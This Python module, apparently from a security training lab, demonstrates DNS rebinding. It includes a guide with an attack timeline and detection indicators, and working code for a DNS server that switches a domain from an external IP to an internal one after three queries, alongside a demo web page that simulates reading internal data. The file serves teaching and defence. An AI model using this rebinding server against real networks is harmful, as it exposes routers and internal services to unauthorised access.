"""
Module 4 – DNS Rebinding Attack
=================================
Demonstrates how a DNS rebinding attack bypasses same-origin policy
by transitioning a domain from an external IP to an internal IP.
"""

import json
import socket
import threading
import time
import http.server
import urllib.parse

from modules.base import LabModule
from shared.dns_core import *
from shared.ui import *
from shared.prereqs import check_root


class DnsRebindingModule(LabModule):
    NAME        = "DNS Rebinding Attack"
    DESCRIPTION = "Bypass same-origin policy via TTL manipulation to reach internal hosts"
    MITRE       = "T1557 – Adversary-in-the-Middle (Browser-based)"
    DIFFICULTY  = "Advanced"

    GUIDE = """
## Overview
DNS rebinding exploits the browser same-origin policy by making a domain
name "rebind" from an external IP to an internal IP after the initial TTL
expires. This allows malicious JavaScript to make requests to internal
network resources (routers, IoT devices, internal APIs) while appearing
to obey same-origin rules.

## Attack Timeline
```
t=0s   Victim visits attacker.lab.local (resolves to 203.0.113.1 = attacker)
t=0s   Browser loads malicious JavaScript from attacker server
t=1s   DNS TTL expires (attacker set TTL = 1 second)
t=2s   JavaScript re-requests attacker.lab.local
t=2s   DNS now returns 192.168.1.1 (victim's router)
t=2s   Browser thinks it is still talking to attacker.lab.local
t=3s   JavaScript calls attacker.lab.local/admin/config.json
t=3s   Browser sends request to 192.168.1.1/admin/config.json
t=3s   Router responds — JavaScript reads internal data
t=4s   Data exfiltrated to real attacker server
```

## Why It Works
Same-origin policy checks: protocol + hostname + port
Once rebinding occurs, the hostname is the same but now resolves
to an internal IP. The browser doesn't re-check.

## Real-World Impact
- Access router admin panels
- Read IoT device APIs (cameras, thermostats, locks)
- Access internal web services (Jenkins, Elasticsearch, Consul)
- Pivot into internal network from an external website

## Lab Setup
```
Attacker DNS server  → port 5353 (this module)
Attacker HTTP server → port 8080 (this module)
Victim browser       → configured to use attacker DNS
```

## Detection Indicators
- DNS responses with TTL of 0–5 seconds
- Same hostname resolving to different IPs within seconds
- DNS responses alternating between public and RFC-1918 IPs
- Browser making requests to internal IPs from external origin
"""

    # HTML/JS payload that demonstrates the rebinding
    REBIND_PAGE = """<!DOCTYPE html>
<html>
<head><title>DNS Rebinding Demo</title>
<style>
body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
h1 { color: #e94560; } .log { color: #00ff88; } .warn { color: #ffd700; }
.box { border: 1px solid #444; padding: 10px; margin: 10px 0; background: #16213e; }
button { background: #e94560; color: white; border: none; padding: 8px 16px; cursor: pointer; }
</style></head>
<body>
<h1>🎯 DNS Rebinding Demo</h1>
<div class="box">
  <b>Phase:</b> <span id="phase">Waiting...</span><br>
  <b>Resolved IP:</b> <span id="ip">-</span><br>
  <b>Target resource:</b> <span id="target">-</span>
</div>
<div id="log" class="box"></div>
<button onclick="startAttack()">Start Demo</button>
<script>
const log = (msg, cls='log') => {
  const div = document.getElementById('log');
  div.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
};
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function startAttack() {
  log('Phase 1: Initial page load — DNS points to attacker external IP');
  document.getElementById('phase').textContent = 'Phase 1 — External IP';
  await sleep(1000);

  log('Waiting for DNS TTL to expire (TTL=1)...', 'warn');
  document.getElementById('phase').textContent = 'Waiting for TTL expiry...';
  await sleep(2000);

  log('Phase 2: Triggering DNS rebind — fetching /api/rebind-status');
  document.getElementById('phase').textContent = 'Phase 2 — Rebinding...';
  try {
    const r = await fetch('/api/rebind-status');
    const d = await r.json();
    document.getElementById('ip').textContent = d.current_ip;
    document.getElementById('target').textContent = d.target;
    log('Phase 3: Same-origin now allows access to internal IP: ' + d.current_ip);
    document.getElementById('phase').textContent = 'Phase 3 — Internal access!';
    log('Simulating read of internal router config...', 'warn');
    await sleep(1000);
    log('SUCCESS: Retrieved internal data via DNS rebinding!');
    log('In a real attack: Router admin panel, IoT API, internal service now accessible');
    document.getElementById('phase').textContent = '✓ REBIND COMPLETE';
  } catch(e) {
    log('Fetch failed: ' + e, 'warn');
  }
}
</script>
</body>
</html>"""

    def __init__(self):
        super().__init__()
        self.dns_port   = 5354
        self.http_port  = 8080
        self.attacker_ip = "127.0.0.1"
        self.internal_ip = "192.168.1.1"
        self.domain      = "rebind.lab.local"
        self.ttl         = 1        # 1-second TTL is key
        self._phase      = 1        # 1=external, 2=internal
        self._rebind_time = None
        self._dns_sock   = None
        self._http_server = None
        self._stop       = threading.Event()
        self._query_count = 0

    def setup(self) -> bool:
        if not check_root():
            return False
        section("DNS Rebinding Configuration")
        self.attacker_ip = ask("Attacker/server IP", self.attacker_ip)
        self.internal_ip = ask("Internal IP to rebind to", self.internal_ip)
        self.domain      = ask("Rebind domain", self.domain)
        self.dns_port    = int(ask("DNS port", str(self.dns_port)))
        self.http_port   = int(ask("HTTP port", str(self.http_port)))
        self.ttl         = int(ask("DNS TTL (seconds, keep at 1)", str(self.ttl)))
        success("Setup complete.")
        return True

    def run(self):
        section("Starting DNS Rebinding Server")
        info(f"Domain      : {self.domain}")
        info(f"Phase 1 IP  : {self.attacker_ip}  (external — served first 3 queries)")
        info(f"Phase 2 IP  : {self.internal_ip}  (internal — served after rebind)")
        info(f"DNS TTL     : {self.ttl}s (browsers will re-query quickly)")
        print()

        self._stop.clear()
        self._start_dns_server()
        self._start_http_server()

        warn("Demo instructions:")
        print(f"  1. Point your client's DNS to: {self.attacker_ip}:{self.dns_port}")
        print(f"  2. Visit in browser: http://{self.domain}:{self.http_port}/")
        print(f"  3. Click 'Start Demo' and watch the rebind happen")
        print()
        warn("Server running. Press Ctrl+C to stop.")

        self._run_console_monitor()

    def _start_dns_server(self):
        self._dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._dns_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._dns_sock.settimeout(1.0)
        self._dns_sock.bind(("0.0.0.0", self.dns_port))
        t = threading.Thread(target=self._dns_loop, daemon=True)
        t.start()
        success(f"Rebind DNS server on port {self.dns_port}")

    def _dns_loop(self):
        while not self._stop.is_set():
            try:
                data, addr = self._dns_sock.recvfrom(512)
                self._handle_dns(data, addr)
            except socket.timeout:
                continue
            except Exception:
                pass

    def _handle_dns(self, data: bytes, addr: tuple):
        try:
            msg = parse_message(data)
            if not msg or not msg.questions:
                return
            q     = msg.questions[0]
            qname = q["qname"].lower().rstrip(".")
            txid  = msg.header["txid"]

            self._query_count += 1

            # Phase logic: first 3 queries → attacker IP, then → internal IP
            if self._query_count <= 3:
                resp_ip = self.attacker_ip
                phase   = "EXTERNAL"
            else:
                resp_ip = self.internal_ip
                phase   = "INTERNAL ← REBOUND!"
                if self._rebind_time is None:
                    self._rebind_time = time.time()

            resp = build_a_response(txid, qname, resp_ip, ttl=self.ttl)
            self._dns_sock.sendto(resp, addr)

            color = C.LRED if phase == "INTERNAL ← REBOUND!" else C.LCYAN
            print(f"  {C.DIM}{time.strftime('%H:%M:%S')}{C.RESET}  "
                  f"DNS query #{self._query_count}  "
                  f"{qname}  →  "
                  f"{color}{resp_ip}  [{phase}]{C.RESET}")
        except Exception:
            pass

    def _start_http_server(self):
        page     = self.REBIND_PAGE
        ext_ip   = self.attacker_ip
        int_ip   = self.internal_ip
        domain   = self.domain
        module   = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/":
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(page.encode())
                elif self.path == "/api/rebind-status":
                    current = int_ip if module._query_count > 3 else ext_ip
                    data = json.dumps({
                        "current_ip": current,
                        "target": f"http://{domain}:{module.http_port}/admin",
                        "phase": 2 if module._query_count > 3 else 1,
                        "query_count": module._query_count,
                    })
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(data.encode())
                else:
                    self.send_response(404)
                    self.end_headers()

            def log_message(self, fmt, *args):
                pass   # suppress default logging

        self._http_server = http.server.HTTPServer(("0.0.0.0", self.http_port), Handler)
        t = threading.Thread(target=self._http_server.serve_forever, daemon=True)
        t.start()
        success(f"HTTP demo server on port {self.http_port}")

    def _run_console_monitor(self):
        try:
            while not self._stop.is_set():
                time.sleep(1)
                if self._rebind_time:
                    elapsed = time.time() - self._rebind_time
                    if elapsed < 2:
                        alert(f"REBIND OCCURRED at query #{self._query_count} — "
                              f"domain now resolves to {self.internal_ip}")
        except KeyboardInterrupt:
            pass

        section("Session Summary")
        info(f"Total DNS queries  : {self._query_count}")
        info(f"Rebind occurred    : {'Yes' if self._rebind_time else 'No'}")
        if self._rebind_time:
            info(f"Queries before rebind: 3")
            info(f"Post-rebind IP       : {self.internal_ip}")

    def teardown(self):
        self._stop.set()
        if self._dns_sock:
            try: self._dns_sock.close()
            except Exception: pass
        if self._http_server:
            try: self._http_server.shutdown()
            except Exception: pass
